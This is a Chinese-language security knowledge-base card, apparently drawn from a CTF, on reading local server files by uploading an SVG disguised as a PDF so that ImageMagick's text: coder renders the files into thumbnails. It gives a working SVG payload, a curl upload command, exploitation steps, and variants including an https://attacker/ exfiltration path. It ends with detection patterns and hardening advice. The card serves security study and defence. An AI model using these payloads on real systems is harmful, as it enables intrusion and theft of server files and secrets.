---
id: web-generic-file-upload-svg-imagemagick-text-protocol-file-read
title: '上传 SVG 经服务端缩略图转换读取本地文件：ImageMagick text: 协议任意文件读取'
type: scenario
domain: web
path: web/generic/file-upload
technique: svg-imagemagick-text-coder-local-file-read
aliases:
- 'SVG text: 协议'
- xlink:href 本地文件
- camera-ready 缩略图读取
- ImageMagick text coder
- pdf-image 任意文件读取
tags:
- web
- file-upload
- svg
- imagemagick
- pdf-image
- thumbnail
- file-read
- ssrf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:28:42+08:00'
  notes: 已对照原文与图09-11核对：camera-ready 上传任意内容强制 .pdf 落盘、pdf-image convertPage(0) 生成缩略图、无害 SVG 可渲染（图10）、xlink:href=text:/flag 的 SVG 生成缩略图并显示 /flag 内容（图11），均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

上传接口只把任意内容按 `.pdf` 落盘、随后用 pdf-image/ImageMagick 生成首帧缩略图时，攻击者可上传伪装成 PDF 的 SVG；SVG 里的 `<image xlink:href="text:/flag">` 会交给 ImageMagick 的 `text:` coder 解析，把服务器本地文件当作文本图像绘制进缩略图，攻击者访问缩略图即可读文件。

## 原理

- 服务端缩略图链通常只做“保存文件 → 调用转换器取第 0 页 → 输出 PNG”。保存时按固定文件名写成 `.pdf`，但没有校验文件头（magic bytes）或真实内容；ImageMagick 识别格式看内容而非扩展名，因此 SVG 内容会走 SVG 解析器。
- ImageMagick 支持多种 coder/协议：`text:` 把文件内容当文本图像读取，`file:` 读本地文件，`https:` 发起网络请求，`msl:` 等还能执行更复杂操作。SVG 的 `<image xlink:href="...">` 在渲染时会把 href 交给 ImageMagick 的图像加载器，于是 `text:/flag` 被解析为“读取 /flag 并绘制成文字图像”。
- 缩略图随后作为普通图片返回给用户，文件内容就以像素形式泄露；如果内容过长被裁切，调整 `width/height/viewBox` 即可截取更多行。
- 根因是“不可信文件 + 服务端图像/文档转换器 + 转换器允许本地文件/网络协议”，三者缺一不可；上传只是投递方式，真正危险的是转换链。

## 触发条件

- 上传接口把文件保存后交给 pdf-image、ImageMagick、Ghostscript 等转换器做缩略图/预览。
- 保存时未校验 magic bytes/MIME，或校验可被 SVG 文本绕过。
- 转换器未通过 policy.xml/沙箱禁用 `text:`、`file:`、`https:`、`msl:` 等 coder。
- 生成的缩略图/预览图可被攻击者访问。

## 利用步骤

1. 找到一个“上传文档 → 生成缩略图/预览”的功能（如 camera-ready、论文附件、头像、发票预览）。
2. 先上传一个无害 SVG（扩展名可改成 `.pdf`），确认服务端仍能生成缩略图，说明内容未被严格校验且转换器按内容解析。
3. 构造带本地文件引用的 SVG，把 `xlink:href` 指向目标文件。
4. 上传后访问缩略图地址；若只显示部分内容，调整 `viewBox`/`width`/`height` 扩大绘制区域。
5. 替换路径读取其他文件（`/etc/passwd`、`/proc/self/environ`、应用配置、密钥文件）。
6. 若 `text:` 被禁用，尝试 `file:`、`https:`（SSRF/外带）、`msl:`、`ephemeral:` 等变体。

## PoC

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="1800" height="360" viewBox="40 40 420 35">
  <rect x="-1000" y="-1000" width="5000" height="5000" fill="white"/>
  <image xlink:href="text:/flag" x="0" y="0" width="612" height="792"/>
</svg>
```

```bash
# 文件名字段伪装成 PDF，内容实际是 SVG
curl -F "cameraReadyPdf=@flag.svg;filename=paper.pdf;type=application/pdf" \
     -b "token=<session>" http://target/papers/<id>/camera-ready
# 访问返回的缩略图地址，/flag 内容被绘制成图片
```

说明：PoC 为原文流程的结构化复现，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体（协议）：`file:///etc/passwd`、`text:/proc/self/environ`、`https://attacker/` 做 SSRF/外带、`msl:` 执行 ImageMagick 脚本；具体可用性取决于 ImageMagick 版本与 policy.xml。
- 变体（载体）：PDF 内嵌 SVG、MVG、EPS、PS 等同样可能触发转换器解析；Ghostscript 链还可结合 `%pipe%`。
- 关联：[[web-generic-xxe-svg-upload-inband-file-read]]（SVG 作为 XML 解析时的 XXE，机制不同但入口相同）；[[web-php-reflectionclass-newinstanceargs-imagick-msl-webshell]]（ImageMagick MSL 导致命令执行）；[[web-nodejs-jspdf-node-readfile-arbitrary-file-read]]（Node.js PDF 库的路径直入 fs）。
- 边界：转换器禁用危险 coder、以非特权用户/容器运行且目标文件不可读、缩略图不返回给用户时，本手法不成立。

## 检测与防御

- 检测：上传内容中出现 `<svg`、`xlink:href`、`text:`、`file:`、`msl:`、`ephemeral:` 等特征；转换进程异常读取敏感路径或外连；缩略图生成接口出现同一用户反复上传/调整尺寸的行为。
- 防御：用 magic bytes + 真实 PDF 解析器校验上传内容，拒绝非 PDF；扩展名只作展示，不作为格式判断依据。
- 加固：在无敏感文件、无网络的容器/沙箱中执行转换；以低权限用户运行；ImageMagick 用 policy.xml 禁用 `text`、`file`、`https`、`msl`、`ephemeral` 等 coder，并限制临时目录与内存。
- 加固：缩略图与上传文件放在独立域名/不可执行目录；对转换服务做文件系统只读挂载与出网限制。
